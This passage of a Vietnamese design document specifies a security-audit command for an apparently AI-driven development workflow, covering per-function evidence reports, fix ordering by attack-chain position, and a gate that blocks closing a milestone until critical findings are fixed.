| 2   | src/api/export.js      | exportToPdf()    | Command Injection | ❌ FAIL | shell: true + template literal     |
| 3   | bin/install.js         | runPostInstall() | Command Injection | ✅ PASS | execFile() với args array          |
| 4   | scripts/build.js       | buildAssets()    | Command Injection | ⚠️ FLAG | spawn() nhưng thiếu input validate |

### Tổng kết

- Đã kiểm tra: 4 hàm / 4 files
- PASS: 1 | FLAG: 1 | FAIL: 2
- Chưa kiểm tra (ngoài scope): [liệt kê files/hàm bỏ qua và lý do]
```

#### Yêu cầu bắt buộc cho mỗi evidence file

1. **Liệt kê TỪNG HÀM** đã kiểm tra — không được chỉ ghi tên file
2. **Ghi loại kiểm tra cụ thể** cho từng hàm (SQL injection, XSS, path traversal, SSRF...)
3. **Đánh PASS/FLAG/FAIL** với giải thích ngắn (1 dòng)
4. **Ghi rõ "Chưa kiểm tra"** — liệt kê hàm/file nào BỊ BỎ QUA và lý do (ngoài scope, không có user input, internal-only...)

#### Format SECURITY_REPORT.md (reporter tổng hợp)

`pd-sec-reporter` tổng hợp N evidence files thành **1 bảng master** sắp theo severity:

```markdown
## SECURITY_REPORT — Milestone v2.8.0

### Bảng Master (FAIL trước → FLAG → PASS)

| #   | Severity | File                   | Hàm/Endpoint     | Loại lỗ hổng       | Scanner              | Ghi chú                 |
| --- | -------- | ---------------------- | ---------------- | ------------------ | -------------------- | ----------------------- |
| 1   | ❌ FAIL  | src/utils/converter.js | execConvert()    | Command Injection  | pd-sec-cmd-injection | exec() với user input   |
| 2   | ❌ FAIL  | src/api/export.js      | exportToPdf()    | Command Injection  | pd-sec-cmd-injection | shell: true             |
| 3   | ⚠️ FLAG  | scripts/build.js       | buildAssets()    | Command Injection  | pd-sec-cmd-injection | thiếu input validate    |
| 4   | ⚠️ FLAG  | src/auth/login.js      | verifyToken()    | JWT None Algorithm | pd-sec-auth          | chưa check algorithm    |
| 5   | ✅ PASS  | bin/install.js         | runPostInstall() | Command Injection  | pd-sec-cmd-injection | execFile() + args array |
| ... | ...      | ...                    | ...              | ...                | ...                  | ...                     |

### Thống kê

- Tổng hàm đã quét: 47
- FAIL: 5 | FLAG: 8 | PASS: 34
- Scanner đã chạy: 6/13 (smart mode)
- Scanner bỏ qua: 7 — [liệt kê + lý do]
- Hàm mới/sửa trong milestone chưa được scan: [liệt kê nếu có]
```

#### Cross-check với CODE_REPORT (chế độ milestone)

Reporter PHẢI so sánh danh sách hàm trong evidence với danh sách hàm mới/sửa trong milestone (từ `CODE_REPORT.md` hoặc `git diff`). Nếu có hàm mới/sửa mà KHÔNG xuất hiện trong bất kỳ evidence nào → **FLAG** hàm đó là "chưa được scan" trong report.

---

### Chiến lược tạo Fix Phases theo Gadget Chain

#### Vấn đề

Không phải mọi lỗ hổng đều độc lập. Trong thực tế red team, attacker chain nhiều lỗi nhỏ thành chuỗi tấn công (gadget chain) dẫn đến RCE:

```
Ví dụ gadget chain thực tế:

Prototype Pollution (pd-sec-prototype-pollution)
  → Ghi đè template engine options (EJS outputFunctionName)
    → Server-Side Template Injection (pd-sec-deserialization)
      → Remote Code Execution (RCE) 💀

Hoặc:

IDOR (pd-sec-auth) → Đọc được API key admin
  → Hardcoded secret tiết lộ DB connection string (pd-sec-secrets)
    → SQL Injection qua raw query (pd-sec-sql-injection)
      → Full database dump → Data Breach 💀
```

#### Nguyên tắc sắp xếp thứ tự fix

Fix phases **PHẢI** được sắp xếp theo thứ tự **ngược gadget chain** — fix điểm cuối trước (nơi RCE xảy ra), rồi mới fix điểm đầu.

**Lưu ý**: Gadget chain analysis bao gồm cả KNOWN-UNFIXED từ phiên cũ — lỗi chưa fix vẫn là điểm yếu có thể chain với lỗi mới phát hiện.

1. **P0-RCE-Endpoint**: Fix các điểm RCE trực tiếp trước (Command Injection, Deserialization RCE, SSTI).
2. **P0-Data-Breach**: Fix các điểm rò rỉ dữ liệu (SQL Injection → dump DB, Secrets lộ ra ngoài).
3. **P0-Auth-Bypass**: Fix authentication/authorization bypass (JWT none algorithm, missing auth middleware).
4. **P1-Gadget-Source**: Fix nguồn gadget (Prototype Pollution, XSS stored) — sau khi endpoint đã an toàn, gadget không còn dẫn đến RCE.
5. **P1-Config-Hardening**: Fix misconfiguration, missing headers, CORS.
6. **P2-Monitoring**: Bổ sung logging, audit trail cho các endpoint đã fix.
7. **P2-Dependencies**: Update packages lỗi thời.

#### Cách tạo fix phases tự động (chỉ chế độ milestone)

Khi `pd-sec-reporter` trả về kết quả có CRITICAL/WARNING **và** đang ở chế độ milestone, hệ thống thực hiện:

```
1. Nhóm các phát hiện theo severity + attack type
2. Xây dựng dependency graph giữa các lỗi (gadget chain analysis)
3. Topological sort → xác định thứ tự fix
4. Tạo fix phases dạng decimal:

   Ví dụ: Milestone 1.1 có 3 giai đoạn (Phase 1, 2, 3)
   Audit tìm được 4 lỗ hổng critical:

   Phase 3 (giai đoạn cuối đã hoàn thành)
   Phase 3.1 — [SEC-FIX] Blocked: Sửa RCE qua Command Injection (2 files)
   Phase 3.2 — [SEC-FIX] Blocked: Sửa SQL Injection (3 endpoints)
   Phase 3.3 — [SEC-FIX] Warning: Sửa Prototype Pollution gadget source (1 file)
   Phase 3.4 — [SEC-FIX] Warning: Cập nhật CORS + CSP headers
   Phase 3.5 — [SEC-VERIFY] Re-audit: Quét lại các file đã fix
```

#### Nội dung mỗi fix phase tự động tạo

Mỗi fix phase sinh ra kèm đầy đủ thông tin từ evidence:

```markdown
---
phase: 3.1
title: "[SEC-FIX] Sửa RCE qua Command Injection"
priority: P0
security-severity: CRITICAL
owasp: A03
related-evidence: evidence_sec_cmdi.md
gadget-chain-position: endpoint (phải fix trước)
---

## Mục tiêu

Loại bỏ 2 điểm Command Injection CRITICAL tại:

- `src/utils/converter.js:45` — exec() với user input
- `src/api/export.js:112` — shell: true với template literal

## Từ Evidence

(trích nguyên văn từ evidence_sec_cmdi.md — file:dòng + code snippet)

## Hướng sửa đề xuất

1. Thay `exec()` bằng `execFile()` với argument array
2. Bỏ `shell: true`, dùng `spawn()` với args riêng biệt
3. Validate input: whitelist ký tự cho phép

## Tiêu chí hoàn thành

- [ ] Không còn CRITICAL trong re-scan evidence_sec_cmdi.md
- [ ] Test case tái hiện attack vector thất bại
- [ ] Code review bởi pd-sec-cmd-injection agent (re-run)
```

---

### Tích hợp vào Complete-Milestone (Security Gate)

#### Bổ sung Guard cho `workflows/complete-milestone.md`

Thêm bước kiểm tra **SAU Bước 1** (vì Bước 1 mới lấy `version` — cần version để biết đường dẫn SECURITY_REPORT):

```markdown
## Bước 1.1: Security Gate (sau khi đã có version từ Bước 1)

1. Kiểm tra file `.planning/milestones/[version]/SECURITY_REPORT.md` tồn tại
2. Nếu KHÔNG tồn tại:
   → Hiển thị: "⚠️ Chưa chạy kiểm toán bảo mật. Vui lòng chạy `/pd:audit` trước."
   → Dừng workflow, KHÔNG cho phép complete
3. Nếu tồn tại:
   → Đọc outcome trong SECURITY_REPORT.md
   → Nếu có CRITICAL chưa fix: "🛑 Còn lỗ hổng CRITICAL. Phải fix trước khi đóng milestone."
   → Nếu có WARNING chưa fix: "⚠️ Còn WARNING — cần xác nhận chấp nhận rủi ro."
   → Nếu clean/đã fix hết: ✅ Cho phép tiếp tục
4. Kiểm tra fix phases (nếu audit đã tạo):
   → Quét `.planning/milestones/[version]/phase-*/TASKS.md` có task loại `[BẢO MẬT]`
   → Task `[BẢO MẬT]` chưa ✅ → "🛑 Còn task bảo mật chưa hoàn thành trong phase [X]. Chạy `/pd:write-code`."
   → Tất cả ✅ nhưng SECURITY_REPORT vẫn có CRITICAL → "Cần chạy lại `/pd:audit` để xác nhận fix."
```

#### Bổ sung Guard cho `commands/pd/complete-milestone.md`

Thêm vào section `<guards>`:

```markdown
- [ ] Có SECURITY_REPORT.md và không còn CRITICAL → "Chạy `/pd:audit` trước khi đóng milestone."
```

Thêm vào section `<execution_context>`:

```markdown
@workflows/audit.md (optional — chỉ để biết nếu cần redirect user)
```

#### Flow tổng thể khi dùng (chế độ milestone)

```
Người dùng phát triển phần mềm bình thường:

  pd:new-milestone → pd:plan → pd:write-code → (N phases dev)
                                                      │
                                                      ▼
                                                  pd:audit
                                                      │
                                        ┌─────────────┼─────────────┐
                                        │             │             │
                                      PASS ✅     WARNING ⚠️    CRITICAL 🛑
                                        │             │             │
                                        ▼             ▼             ▼
                              pd:complete      Hỏi user       Tạo fix phases
                              -milestone     accept/fix?      (Phase N.1, N.2...)
                                                  │                 │
                                            ┌─────┴─────┐          ▼
                                          Accept      Fix    pd:write-code (fix)
                                            │           │          │
                                            ▼           ▼          ▼
                                      complete    Tạo fix      pd:audit
                                      -milestone  phases       (re-audit)
                                                                 │
                                                           PASS? → complete
```

#### Flow khi dùng độc lập (không có milestone)

```
User muốn quét bảo mật trên repo bất kỳ:

  pd:audit [path]
      │
      ▼
  Smart select → N scanner → SECURITY_REPORT.md (thư mục gốc)
      │
      ├─ PASS ✅ → "Không phát hiện lỗ hổng."
      ├─ WARNING ⚠️ → Liệt kê cảnh báo + đề xuất
      └─ CRITICAL 🛑 → Liệt kê lỗ hổng + hướng fix
                         (KHÔNG tạo fix phases — không có roadmap)
```

---

### Cấu hình & Giới hạn

| Tham số                | Giá trị          | Ghi chú                              |
| ---------------------- | ---------------- | ------------------------------------ |
| Max concurrent agents  | 2                | Tránh quá tải CPU/RAM                |
| Scout agent timeout    | 120s             | Đủ cho quét ~10K dòng code           |
| Builder agent timeout  | 180s             | Reporter cần thời gian tổng hợp      |
| Max fix phases tự động | 10               | Nếu >10, cảnh báo architectural debt |
| Re-audit scope         | Chỉ files đã fix | Không quét lại toàn bộ               |

### Cấu trúc thư mục Evidence

**Chế độ milestone (smart mode — ví dụ upload avatar, 6 scanner):**

```
.planning/milestones/v1.1/
├── SECURITY_REPORT.md          ← Báo cáo tổng hợp (ghi rõ scanner nào chạy/bỏ qua)
├── security/
│   ├── evidence_sec_secrets.md     ← Luôn chạy
│   ├── evidence_sec_crypto.md      ← Luôn chạy
│   ├── evidence_sec_deps.md        ← Luôn chạy
│   ├── evidence_sec_pathtr.md      ← Smart: upload signal
│   ├── evidence_sec_cmdi.md        ← Smart: spawn/exec signal
│   └── evidence_sec_xss.md         ← Smart: filename injection
│   (các evidence khác KHÔNG tạo — scanner không chạy)
├── CHANGELOG.md
├── CURRENT_MILESTONE.md
└── ...
```

**Chế độ milestone (--full, đủ 13 scanner):**

```
.planning/milestones/v1.1/
├── SECURITY_REPORT.md
├── security/
│   ├── evidence_sec_sqli.md
│   ├── evidence_sec_xss.md
│   ├── evidence_sec_cmdi.md
│   ├── evidence_sec_pathtr.md
│   ├── evidence_sec_secrets.md
│   ├── evidence_sec_auth.md
│   ├── evidence_sec_deser.md
│   ├── evidence_sec_misconfig.md
│   ├── evidence_sec_pollution.md
│   ├── evidence_sec_crypto.md
│   ├── evidence_sec_design.md
│   ├── evidence_sec_deps.md
│   └── evidence_sec_logging.md
└── ...
```

**Chế độ độc lập:**

```
[project-root]/
├── SECURITY_REPORT.md          ← Báo cáo tổng hợp
└── .security/
    └── evidence/
        ├── evidence_sec_sqli.md
        ├── evidence_sec_xss.md
        ├── ... (13 files)
        └── evidence_sec_logging.md
```

### Cập nhật State Machine

Thêm `pd:audit` vào `references/state-machine.md`:

```
Luồng chính (không đổi):
  pd:init → pd:scan → pd:new-milestone → pd:plan → pd:write-code → pd:test → pd:complete-milestone

Nhánh phụ (bất kỳ lúc nào sau init):
  - /pd:fix-bug → điều tra + sửa lỗi
  - /pd:audit → kiểm toán bảo mật OWASP Top 10     ← MỚI
  - /pd:what-next → kiểm tra tiến trình
  - /pd:fetch-doc → cache tài liệu
  - /pd:update → cập nhật skills

Điều kiện tiên quyết pd:audit:
  | /pd:audit | — | Không cần điều kiện, chạy được trên mọi dự án |

Điều kiện tiên quyết pd:complete-milestone (BỔ SUNG):
  | /pd:complete-milestone | ... + SECURITY_REPORT.md | "Chạy `/pd:audit` trước" |
```

---

### Lợi ích

- **Smart selection**: Chỉ gọi scanner liên quan đến tính năng milestone — tiết kiệm 30-60% token so với chạy đủ 13.
- **Session delta**: Đối soát phiên cũ trước khi scan — không quét lại lỗi đã biết, chỉ verify fix đã hoàn thành.
- **POC-driven**: `--poc` tạo bằng chứng khai thác rõ ràng — từ POC đơn lẻ đến gadget chain exploit.
- **Shift-left security**: Bắt lỗi bảo mật TRƯỚC khi ship, không phải SAU khi bị hack.
- **Hoạt động độc lập**: Quét bất kỳ repo nào, không bắt buộc có `.planning/` hay milestone.
- **Tích hợp tự nhiên**: Khi có milestone, là security gate bắt buộc — một bước trong flow quen thuộc.
- **Gadget chain awareness**: Không fix random — fix theo thứ tự ưu tiên RCE chain, kể cả KNOWN-UNFIXED từ phiên cũ.
- **Audit trail**: Evidence tích lũy qua phiên — kiểm tra lại bất kỳ lúc nào, thấy rõ lịch sử fix.

---

### Rủi ro & Biện pháp giảm thiểu

| Rủi ro                                       | Xác suất   | Biện pháp                                                             |
| -------------------------------------------- | ---------- | --------------------------------------------------------------------- |
| False positive quá nhiều → developer mệt mỏi | Trung bình | Rule chặt trong agent + smart selection bỏ scanner không liên quan    |
| Smart selection bỏ sót scanner cần thiết     | Thấp       | Luôn chạy 3 base scanner + `--full` override khi cần toàn diện        |
| Agent timeout trên dự án lớn (>50K dòng)     | Thấp       | Milestone mode giới hạn scope = git diff, standalone quét toàn bộ     |
| Gadget chain analysis sai thứ tự             | Thấp       | pd-sec-reporter topological sort dựa trên OWASP severity + dependency |
| Quá tải khi chạy đủ 13 agent                 | Thấp       | Batch 2 agent, backpressure, timeout per agent                        |
| Lỗi bảo mật nằm ngoài OWASP Top 10           | Thấp       | Mở rộng agent mới khi cần, kiến trúc plugin-based                     |

---

### So sánh với `gsd-audit-milestone` (GSD skill)

|               | `pd:audit` (PD command)                                        | `gsd-audit-milestone` (GSD skill)                                                   |
| ------------- | -------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| **Mục đích**  | Kiểm toán **bảo mật** mã nguồn                                 | Kiểm toán **hoàn thành** milestone (requirements coverage, cross-phase integration) |
| **Scope**     | OWASP Top 10 — 13 scanner (smart selection chọn cái liên quan) | Definition of Done — tasks, tests, verification                                     |
| **Độc lập**   | ✅ Chạy trên mọi repo                                          | ❌ Cần `.planning/` + milestone context                                             |
| **Thời điểm** | Trước `pd:complete-milestone` hoặc bất kỳ lúc nào              | Trước `gsd-complete-milestone`                                                      |
| **Bổ sung**   | Hai lệnh KHÔNG thay thế nhau — cùng chạy trước complete        |

---

_Ghi chú: `pd:audit` là security gate bắt buộc trong quy trình milestone. Khi có `.planning/`, không có SECURITY_REPORT.md = không đóng milestone. Khi không có `.planning/`, lệnh hoạt động như công cụ quét bảo mật độc lập._
